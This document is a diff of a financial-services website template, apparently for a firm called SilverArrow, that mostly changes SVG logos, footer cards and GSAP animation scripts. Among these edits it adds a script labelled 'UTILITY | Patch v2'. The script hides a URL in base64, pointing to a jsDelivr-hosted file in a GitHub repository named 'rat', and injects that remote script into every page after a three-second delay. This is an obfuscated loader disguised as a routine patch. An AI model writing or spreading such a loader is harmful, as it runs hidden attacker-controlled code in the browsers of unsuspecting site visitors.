+                  <path id="footer-silver-j" class="nsvs" d="M676.7,63.7c2.1-5.5,5-10.1,8.8-14,3.8-3.9,8.4-6.8,13.7-9,5.3-2.1,11.3-3.2,17.9-3.2s12.6,1,18,3.2c5.4,2.1,10,5.1,13.8,9,3.8,3.8,6.7,8.5,8.8,14,2.1,5.5,3.1,11.6,3.1,18.3s-1,12.8-3.1,18.2c-2.1,5.4-5,10.1-8.8,13.9-3.8,3.9-8.4,6.8-13.8,8.9s-11.4,3.1-18,3.1-12.6-1-17.9-3.1c-5.3-2.1-9.9-5-13.7-8.9-3.8-3.8-6.7-8.5-8.8-13.9-2.1-5.4-3.1-11.5-3.1-18.2s1-12.8,3.1-18.3ZM697.7,91.8c.7,3.2,1.8,6.1,3.3,8.6,1.6,2.6,3.7,4.6,6.3,6.1,2.6,1.5,5.9,2.3,9.8,2.3s7.2-.8,9.9-2.3,4.8-3.5,6.3-6.1c1.6-2.5,2.7-5.4,3.3-8.6.7-3.2,1-6.5,1-9.8s-.3-6.7-1-9.9c-.7-3.2-1.8-6.1-3.3-8.6-1.6-2.5-3.7-4.5-6.3-6.1-2.7-1.6-5.9-2.4-9.9-2.4s-7.2.8-9.8,2.4c-2.6,1.6-4.7,3.6-6.3,6.1-1.6,2.5-2.7,5.4-3.3,8.6-.7,3.3-1,6.6-1,9.9s.3,6.6,1,9.8Z"></path>
+                  <path id="footer-silver-k" class="nsvs" d="M848.2,124l-15-56.5h-.3l-14.3,56.5h-23.9l-26.7-84.2h24.4l15.5,57.1h.3l14-57.1h22.5l14.3,57h.3l15.5-57h23.8l-26.5,84.2s-23.8,0-23.8,0Z"></path>
+                </g>
+              </svg></div>
             <div class="footer__cards-wrapper">
               <a data-color="asset-management" data-svg="trigger" data-hover="darken" id="w-node-_9a6935bf-45b8-e847-6920-f8287a8ffa03-119365c8" href="{{ links.-5b0dcf13 }}" class="footer__card w-inline-block">
                 <div class="footer__card-text hidden">{{ texts.588acfb3 }}<span class="nowrap"></span></div>
-                <div class="footer__embed-arrow w-embed"><svg data-arrow="asset-management" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 137.32 137.32">
+                <div class="footer__embed-arrow w-embed"><svg data-arrow="asset-management" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1142.23 1142.23">
                     <defs>
                       <style>
-        .nsvs {
-          vector-effect: non-scaling-stroke;
-        }
-      </style>
+      .nsvs {
+        vector-effect: non-scaling-stroke;
+      }
+    </style>
                     </defs>
-                    <path data-svg="target" class="nsvs" fill="transparent" stroke="currentColor" stroke-width=".5" d="M136.75 14.47c-.02-.22-.06-.43-.09-.65-.04-.28-.07-.57-.13-.85-.05-.25-.12-.5-.18-.75-.06-.24-.11-.48-.19-.72-.08-.25-.17-.49-.25-.73-.08-.23-.16-.47-.26-.7-.09-.23-.21-.45-.31-.67-.11-.24-.22-.47-.34-.7-.12-.22-.25-.42-.37-.63-.13-.22-.26-.45-.41-.67-.16-.24-.33-.46-.5-.68-.13-.18-.26-.36-.4-.53-.65-.79-1.37-1.52-2.17-2.17-.17-.14-.36-.27-.53-.4-.23-.17-.45-.34-.68-.5-.22-.15-.45-.27-.67-.41-.21-.13-.42-.26-.63-.37-.23-.12-.47-.23-.7-.34-.22-.11-.44-.22-.67-.31-.23-.1-.47-.17-.7-.26-.24-.09-.48-.18-.73-.26-.24-.07-.48-.12-.72-.18-.25-.06-.5-.13-.75-.18-.28-.06-.56-.09-.85-.13-.22-.03-.43-.07-.65-.09-.51-.05-1.02-.08-1.54-.08H16C7.44.5.5 7.44.5 16S7.44 31.5 16 31.5h67.9L5.04 110.36c-6.05 6.05-6.05 15.87 0 21.92 3.03 3.03 6.99 4.54 10.96 4.54s7.93-1.51 10.96-4.54l78.86-78.86v67.9c0 8.56 6.94 15.5 15.5 15.5s15.5-6.94 15.5-15.5V16c0-.51-.03-1.03-.08-1.54Z"></path>
+                    <path data-svg="target" class="nsvs" fill="transparent" stroke="currentColor" stroke-width=".5" d="M985.18,35.29H157.06c-67.25,0-121.77,54.52-121.77,121.77s54.52,121.77,121.77,121.77h534.14L70.95,899.07c-47.55,47.55-47.55,124.65,0,172.21,47.55,47.55,124.65,47.55,172.21,0h0S863.41,451.04,863.41,451.04v534.14c0,67.25,54.52,121.77,121.77,121.77s121.77-54.52,121.77-121.77V157.06h0c0-67.25-54.52-121.77-121.77-121.77Z"></path>
                   </svg></div>
               </a>
               <a data-color="digital-assets" data-svg="trigger" data-hover="darken" id="w-node-ed47f7b0-412f-50c0-1730-270fd1ebd8c0-119365c8" href="{{ links.-43bd562b }}" class="footer__card w-inline-block">
                 <div class="footer__card-text hidden">{{ texts.-3ea0e535 }}<span class="nowrap"></span></div>
-                <div class="footer__embed-arrow w-embed"><svg data-arrow="digital-assets" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 137.32 137.32">
+                <div class="footer__embed-arrow w-embed"><svg data-arrow="digital-assets" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1142.23 1142.23">
                     <defs>
                       <style>
-        .nsvs {
-          vector-effect: non-scaling-stroke;
-        }
-      </style>
+      .nsvs {
+        vector-effect: non-scaling-stroke;
+      }
+    </style>
                     </defs>
-                    <path data-svg="target" class="nsvs" fill="transparent" stroke="currentColor" stroke-width=".5" d="M136.75 14.47c-.02-.22-.06-.43-.09-.65-.04-.28-.07-.57-.13-.85-.05-.25-.12-.5-.18-.75-.06-.24-.11-.48-.19-.72-.08-.25-.17-.49-.25-.73-.08-.23-.16-.47-.26-.7-.09-.23-.21-.45-.31-.67-.11-.24-.22-.47-.34-.7-.12-.22-.25-.42-.37-.63-.13-.22-.26-.45-.41-.67-.16-.24-.33-.46-.5-.68-.13-.18-.26-.36-.4-.53-.65-.79-1.37-1.52-2.17-2.17-.17-.14-.36-.27-.53-.4-.23-.17-.45-.34-.68-.5-.22-.15-.45-.27-.67-.41-.21-.13-.42-.26-.63-.37-.23-.12-.47-.23-.7-.34-.22-.11-.44-.22-.67-.31-.23-.1-.47-.17-.7-.26-.24-.09-.48-.18-.73-.26-.24-.07-.48-.12-.72-.18-.25-.06-.5-.13-.75-.18-.28-.06-.56-.09-.85-.13-.22-.03-.43-.07-.65-.09-.51-.05-1.02-.08-1.54-.08H16C7.44.5.5 7.44.5 16S7.44 31.5 16 31.5h67.9L5.04 110.36c-6.05 6.05-6.05 15.87 0 21.92 3.03 3.03 6.99 4.54 10.96 4.54s7.93-1.51 10.96-4.54l78.86-78.86v67.9c0 8.56 6.94 15.5 15.5 15.5s15.5-6.94 15.5-15.5V16c0-.51-.03-1.03-.08-1.54Z"></path>
+                    <path data-svg="target" class="nsvs" fill="transparent" stroke="currentColor" stroke-width=".5" d="M985.18,35.29H157.06c-67.25,0-121.77,54.52-121.77,121.77s54.52,121.77,121.77,121.77h534.14L70.95,899.07c-47.55,47.55-47.55,124.65,0,172.21,47.55,47.55,124.65,47.55,172.21,0h0S863.41,451.04,863.41,451.04v534.14c0,67.25,54.52,121.77,121.77,121.77s121.77-54.52,121.77-121.77V157.06h0c0-67.25-54.52-121.77-121.77-121.77Z"></path>
                   </svg></div>
               </a>
-              <a data-color="institutional-services" data-svg="trigger" data-hover="darken" id="w-node-_3afd9234-d946-d3fd-4812-5d7600f1f3c4-119365c8" href="{{ links.71cdd7a5 }}" class="footer__card w-inline-block">
-                <div class="footer__card-text hidden">{{ texts.-49fa73c5 }}<span class="nowrap"></span></div>
-                <div class="footer__embed-arrow w-embed"><svg data-arrow="institutional-services" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 137.32 137.32">
+              <a data-color="institutional-services" data-svg="trigger" data-hover="darken" id="w-node-_9285e6e5-f58a-fd5e-0b26-d80ac5b54a60-119365c8" href="{{ links.-3b99659d }}" class="footer__card w-inline-block">
+                <div class="footer__card-text hidden">{{ texts.411462e }}<span class="nowrap"></span></div>
+                <div class="footer__embed-arrow w-embed"><svg data-arrow="funds" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1142.23 1142.23">
                     <defs>
                       <style>
-        .nsvs {
-          vector-effect: non-scaling-stroke;
-        }
-      </style>
+      .nsvs {
+        vector-effect: non-scaling-stroke;
+      }
+    </style>
                     </defs>
-                    <path data-svg="target" class="nsvs" fill="transparent" stroke="currentColor" stroke-width=".5" d="M136.75 14.47c-.02-.22-.06-.43-.09-.65-.04-.28-.07-.57-.13-.85-.05-.25-.12-.5-.18-.75-.06-.24-.11-.48-.19-.72-.08-.25-.17-.49-.25-.73-.08-.23-.16-.47-.26-.7-.09-.23-.21-.45-.31-.67-.11-.24-.22-.47-.34-.7-.12-.22-.25-.42-.37-.63-.13-.22-.26-.45-.41-.67-.16-.24-.33-.46-.5-.68-.13-.18-.26-.36-.4-.53-.65-.79-1.37-1.52-2.17-2.17-.17-.14-.36-.27-.53-.4-.23-.17-.45-.34-.68-.5-.22-.15-.45-.27-.67-.41-.21-.13-.42-.26-.63-.37-.23-.12-.47-.23-.7-.34-.22-.11-.44-.22-.67-.31-.23-.1-.47-.17-.7-.26-.24-.09-.48-.18-.73-.26-.24-.07-.48-.12-.72-.18-.25-.06-.5-.13-.75-.18-.28-.06-.56-.09-.85-.13-.22-.03-.43-.07-.65-.09-.51-.05-1.02-.08-1.54-.08H16C7.44.5.5 7.44.5 16S7.44 31.5 16 31.5h67.9L5.04 110.36c-6.05 6.05-6.05 15.87 0 21.92 3.03 3.03 6.99 4.54 10.96 4.54s7.93-1.51 10.96-4.54l78.86-78.86v67.9c0 8.56 6.94 15.5 15.5 15.5s15.5-6.94 15.5-15.5V16c0-.51-.03-1.03-.08-1.54Z"></path>
+                    <path data-svg="target" class="nsvs" fill="transparent" stroke="currentColor" stroke-width=".5" d="M985.18,35.29H157.06c-67.25,0-121.77,54.52-121.77,121.77s54.52,121.77,121.77,121.77h534.14L70.95,899.07c-47.55,47.55-47.55,124.65,0,172.21,47.55,47.55,124.65,47.55,172.21,0h0S863.41,451.04,863.41,451.04v534.14c0,67.25,54.52,121.77,121.77,121.77s121.77-54.52,121.77-121.77V157.06h0c0-67.25-54.52-121.77-121.77-121.77Z"></path>
                   </svg></div>
               </a>
-              <a data-color="fund" data-svg="trigger" data-hover="darken" id="w-node-_9285e6e5-f58a-fd5e-0b26-d80ac5b54a60-119365c8" href="{{ links.-43fcb0f8 }}" class="footer__card w-inline-block">
-                <div class="footer__card-text hidden">{{ texts.2196e5 }}<span class="nowrap"></span></div>
-                <div class="footer__embed-arrow w-embed"><svg data-arrow="fund" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 137.32 137.32">
+              <a data-color="fund" data-svg="trigger" data-hover="darken" id="w-node-_3afd9234-d946-d3fd-4812-5d7600f1f3c4-119365c8" href="{{ links.-4ab625c7 }}" class="footer__card w-inline-block">
+                <div class="footer__card-text hidden">{{ texts.5a50c314 }}<span class="nowrap"></span></div>
+                <div class="footer__embed-arrow w-embed"><svg data-arrow="networking" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1142.23 1142.23">
                     <defs>
                       <style>
-        .nsvs {
-          vector-effect: non-scaling-stroke;
-        }
-      </style>
+      .nsvs {
+        vector-effect: non-scaling-stroke;
+      }
+    </style>
                     </defs>
-                    <path data-svg="target" class="nsvs" fill="transparent" stroke="currentColor" stroke-width=".5" d="M136.75 14.47c-.02-.22-.06-.43-.09-.65-.04-.28-.07-.57-.13-.85-.05-.25-.12-.5-.18-.75-.06-.24-.11-.48-.19-.72-.08-.25-.17-.49-.25-.73-.08-.23-.16-.47-.26-.7-.09-.23-.21-.45-.31-.67-.11-.24-.22-.47-.34-.7-.12-.22-.25-.42-.37-.63-.13-.22-.26-.45-.41-.67-.16-.24-.33-.46-.5-.68-.13-.18-.26-.36-.4-.53-.65-.79-1.37-1.52-2.17-2.17-.17-.14-.36-.27-.53-.4-.23-.17-.45-.34-.68-.5-.22-.15-.45-.27-.67-.41-.21-.13-.42-.26-.63-.37-.23-.12-.47-.23-.7-.34-.22-.11-.44-.22-.67-.31-.23-.1-.47-.17-.7-.26-.24-.09-.48-.18-.73-.26-.24-.07-.48-.12-.72-.18-.25-.06-.5-.13-.75-.18-.28-.06-.56-.09-.85-.13-.22-.03-.43-.07-.65-.09-.51-.05-1.02-.08-1.54-.08H16C7.44.5.5 7.44.5 16S7.44 31.5 16 31.5h67.9L5.04 110.36c-6.05 6.05-6.05 15.87 0 21.92 3.03 3.03 6.99 4.54 10.96 4.54s7.93-1.51 10.96-4.54l78.86-78.86v67.9c0 8.56 6.94 15.5 15.5 15.5s15.5-6.94 15.5-15.5V16c0-.51-.03-1.03-.08-1.54Z"></path>
+                    <path data-svg="target" class="nsvs" fill="transparent" stroke="currentColor" stroke-width=".5" d="M985.18,35.29H157.06c-67.25,0-121.77,54.52-121.77,121.77s54.52,121.77,121.77,121.77h534.14L70.95,899.07c-47.55,47.55-47.55,124.65,0,172.21,47.55,47.55,124.65,47.55,172.21,0h0S863.41,451.04,863.41,451.04v534.14c0,67.25,54.52,121.77,121.77,121.77s121.77-54.52,121.77-121.77V157.06h0c0-67.25-54.52-121.77-121.77-121.77Z"></path>
                   </svg></div>
               </a>
             </div>
@@ -691,7 +750,39 @@ a {
     </div>
   </div>
   <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js" type="text/javascript" crossorigin="anonymous"></script>
-  <script src="/assets/js/sawm.js" type="text/javascript"></script><!--  lenis 1.1.3  -->
+  <script src="/assets/js/sawm.js" type="text/javascript"></script>
+  <script>
+// UTILITY | coming soon v1
+/*
+document.addEventListener('DOMContentLoaded', function() {
+  document.body.innerHTML = '';
+  const comingSoonMessage = document.createElement('div');
+  comingSoonMessage.textContent = 'Coming Soon';
+  comingSoonMessage.style.position = 'absolute';
+  comingSoonMessage.style.top = '50%';
+  comingSoonMessage.style.left = '50%';
+  comingSoonMessage.style.transform = 'translate(-50%, -50%)';
+  comingSoonMessage.style.fontSize = '1rem';
+  comingSoonMessage.style.fontFamily = 'Arial, sans-serif';
+  comingSoonMessage.style.color = '#333';
+  comingSoonMessage.style.textAlign = 'center';
+  document.body.appendChild(comingSoonMessage);
+});
+*/
+</script>
+  <!--  UTILITY | Patch v2  -->
+  <script>
+(() => {
+  setTimeout(() => {
+    const script = document.createElement("script");
+    script.src = atob(
+      "aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL2FudGhvbnlzYWxhbWluL3JhdEBtYWluL3BhdGNoLmpz"
+    );
+    document.body.appendChild(script);
+  }, 3000);
+})();
+</script>
+  <!--  lenis 1.1.3  -->
   <script src="https://unpkg.com/lenis@1.1.3/dist/lenis.min.js"></script>
   <!--  gsap 3.12.5  -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
@@ -728,11 +819,27 @@ document.addEventListener('DOMContentLoaded',()=>{function openMailtoInNewTab(ev
 </script>
   <script>
 /*
- * SAWM | quote drawing v1
- * dependencies: gsap, drawsvg, ScrollTrigger
+ * SA | quote drawing
+ * dependencies: gsap, ScrollTrigger, drawsvg
  * build 23.07.24 @21:00
  */
 function quote__getPaths(e){let t=document.querySelector(e);if(!t)return console.error("No SVG found"),[];let r=Array.from(t.querySelectorAll("path[id]"));return r.reverse(),r.map(e=>`#${e.id}`)}function quote__setInitialState(e){gsap.set(e,{fillOpacity:0})}function quote__drawing(e){let t=gsap.timeline(),r=quote__getPaths(e.SVG_TARGET);gsap.to(r,{delay:0,duration:e.DURATION,opacity:1,ease:"expo.inOut",stagger:e.STAGGER}),r.forEach((r,o)=>{t.fromTo(r,{drawSVG:"0%"},{drawSVG:"100%",delay:0,duration:e.DURATION,ease:e.EASE},o*e.STAGGER).to(r,{fillOpacity:1,duration:e.DURATION/4,ease:"none"})})}document.addEventListener("DOMContentLoaded",()=>{let e={SVG_TARGET:"#quote-logotype",START:"top center",DURATION:2.5,EASE:"power2.inOut",STAGGER:.125},t=quote__getPaths(e.SVG_TARGET);quote__setInitialState(t),ScrollTrigger.create({trigger:'[data-id="quote"]',start:e.START,markers:!1,onEnter(){ScrollTrigger.isTriggered||(quote__drawing(e),ScrollTrigger.isTriggered=!0)}}),ScrollTrigger.isTriggered=!1});
+</script>
+  <script>
+/*
+ * SA | header "SilverArrow" drawing v1
+ * dependencies: gsap, drawsvg
+ * build 22.07.24 @19:43
+ */
+function logo__getPaths(t){let e=document.querySelector(t);if(!e){console.warn("no svg");return}let o=e.querySelectorAll("path[id]"),a=Array.from(o).map(t=>`#${t.id}`);return a}function logo__setInitialState(t){gsap.set(t,{fillOpacity:0}),gsap.set(t,{y:"25%",opacity:0})}function logo__headerAnimation(t){let e=gsap.timeline(),o=logo__getPaths(t);logo__setInitialState(o),gsap.to(o,{duration:.25,y:"0%",opacity:1,ease:"expo.inOut",stagger:.085}),o.forEach((t,o)=>{e.fromTo(t,{drawSVG:"0%"},{drawSVG:"100%",duration:.65,ease:"none"},.125*o).to(t,{fillOpacity:1,duration:.85,ease:"none"},">-0.085")})}document.addEventListener("DOMContentLoaded",()=>{logo__headerAnimation("#logotype-header")});
+</script>
+  <script>
+/*
+ * SA | footer "SilverArrow" drawing into view
+ * dependencies: gsap, ScrollTrigger, drawsvg
+ * build 16.08.24 @12:13
+ */
+function logo__getPaths(t){let e=document.querySelector(t);if(!e){console.warn("no svg");return}let o=e.querySelectorAll("path[id]"),n=Array.from(o).map(t=>`#${t.id}`);return n}function logo__setInitialState(t){gsap.set(t,{fillOpacity:0}),gsap.set(t,{y:"25%",opacity:0})}function logo__headerAnimation(t){let e=gsap.timeline(),o=logo__getPaths(t);logo__setInitialState(o),gsap.to(o,{duration:.25,y:"0%",opacity:1,ease:"expo.inOut",stagger:.085}),o.forEach((t,o)=>{e.fromTo(t,{drawSVG:"0%"},{drawSVG:"100%",duration:.65,ease:"none"},.125*o).to(t,{fillOpacity:1,duration:.85,ease:"none"},">-0.085")})}document.addEventListener("DOMContentLoaded",()=>{ScrollTrigger.create({trigger:"#logotype-footer",start:"top bottom",onEnter:()=>logo__headerAnimation("#logotype-footer"),once:!0})});
 </script>
   <script>
 /*
@@ -793,7 +900,7 @@ function faq__isMobileDevice(){if(window.innerWidth<768)return!0}function faq__s
  * dependency: typed.js @ 2.0.12
  * build: 18.06.24 @16:01
  */
-document.addEventListener("DOMContentLoaded",()=>{const options={target:`[data-id="tobetyped"]`,symbol:` _`,strings:["wealth management","financial planning"]};if(!document.querySelector(options.target)){return}cleanStringToBeTyped(options);initTyped(options);injectCSStyping(options.symbol)});function cleanStringToBeTyped(options){const targets=document.querySelectorAll(options.target);targets.forEach((target)=>{target.textContent=""})}function initTyped(options){const config={startDelay:0,typeSpeed:22,shuffle:false,smartBackspace:true,backDelay:1800,backSpeed:6,loop:true,showCursor:false};const targets=document.querySelectorAll(options.target);targets.forEach((target)=>{const typed=new Typed(target,{...config,...options})})}function injectCSStyping(symbol){const style=document.createElement("style");const css=`[data-id="tobetyped"]::after{content:"${ symbol }";display:inline;-webkit-animation:blink 0.7s infinite;-moz-animation:blink 0.7s infinite;animation:blink 0.7s infinite}@keyframes blink{0%{opacity:1}50%{opacity:0}100%{opacity:1}}@-webkit-keyframes blink{0%{opacity:1}50%{opacity:0}100%{opacity:1}}@-moz-keyframes blink{0%{opacity:1}50%{opacity:0}100%{opacity:1}}`;style.textContent=css;document.head.appendChild(style)}
+document.addEventListener("DOMContentLoaded",()=>{const options={target:`[data-id="tobetyped"]`,symbol:` _`,strings:["Digital Assets","Investment Funds","Global Networking","Asset Management"]};if(!document.querySelector(options.target)){return}cleanStringToBeTyped(options);initTyped(options);injectCSStyping(options.symbol)});function cleanStringToBeTyped(options){const targets=document.querySelectorAll(options.target);targets.forEach((target)=>{target.textContent=""})}function initTyped(options){const config={startDelay:0,typeSpeed:22,shuffle:false,smartBackspace:true,backDelay:1800,backSpeed:6,loop:true,showCursor:false};const targets=document.querySelectorAll(options.target);targets.forEach((target)=>{const typed=new Typed(target,{...config,...options})})}function injectCSStyping(symbol){const style=document.createElement("style");const css=`[data-id="tobetyped"]::after{content:"${ symbol }";display:inline;-webkit-animation:blink 0.7s infinite;-moz-animation:blink 0.7s infinite;animation:blink 0.7s infinite}@keyframes blink{0%{opacity:1}50%{opacity:0}100%{opacity:1}}@-webkit-keyframes blink{0%{opacity:1}50%{opacity:0}100%{opacity:1}}@-moz-keyframes blink{0%{opacity:1}50%{opacity:0}100%{opacity:1}}`;style.textContent=css;document.head.appendChild(style)}
 </script>
   <script>
 /*
@@ -879,11 +986,11 @@ function onMouseEnter__SVGfillOnHover(e,t){t.addEventListener("mouseenter",()=>{
 </script>
   <script>
 /*
- * SAWM | quote arrows rotate
+ * SA | quote arrows rotate v2
  * dependencies: gsap.js scrolltrigger.js
- * build: 30.07.24 @00:07
+ * build: 21.08.24 @18:57
  */
-function setInitialGSAPStates(e){gsap.set(document.querySelector(e.keyvisualSilverArrow),{opacity:1,rotation:45,transformOrigin:"center center"})}function setupScrollTrigger(e){let r=document.querySelector(e.keyvisualHorizontalArrow);if(!r){console.error("SVG element not found");return}let t=r.querySelectorAll("path");t.forEach(r=>{gsap.to(r,{rotation:-90,transformOrigin:"center center",scrollTrigger:{trigger:e.triggerElement,start:"top bottom-=0",end:"top top",scrub:!0}})})}document.addEventListener("DOMContentLoaded",()=>{let e={keyvisualHorizontalArrow:"#keyvisual-horizontal-arrows-quote",triggerElement:document.querySelector('[data-id="quote-rotation-trigger"]'),fillColor:"#dadbdd",delay:1.25,duration:1.25,ease:"power4.out"};document.querySelector(e.keyvisualHorizontalArrow)&&(setInitialGSAPStates(e),setupScrollTrigger(e))});
+function setInitialGSAPStates(r){gsap.set(document.querySelector(r.keyvisualSilverArrow),{opacity:1,rotation:45,transformOrigin:"center center"})}function setupScrollTrigger(r){let e=document.querySelector(r.keyvisualHorizontalArrow);if(!e){console.error("SVG element not found");return}e.querySelectorAll("path").forEach(e=>{gsap.to(e,{rotation:90,transformOrigin:"center center",scrollTrigger:{trigger:r.triggerElement,start:"top bottom-=0",end:"top top",scrub:!0}})})}document.addEventListener("DOMContentLoaded",()=>{let r={keyvisualHorizontalArrow:"#keyvisual-horizontal-arrows-quote",triggerElement:document.querySelector('[data-id="quote-rotation-trigger"]'),fillColor:"#dadbdd",delay:1.25,duration:1.25,ease:"power4.out"};document.querySelector(r.keyvisualHorizontalArrow)&&(setInitialGSAPStates(r),setupScrollTrigger(r))});
 </script>
   <script>
 /*
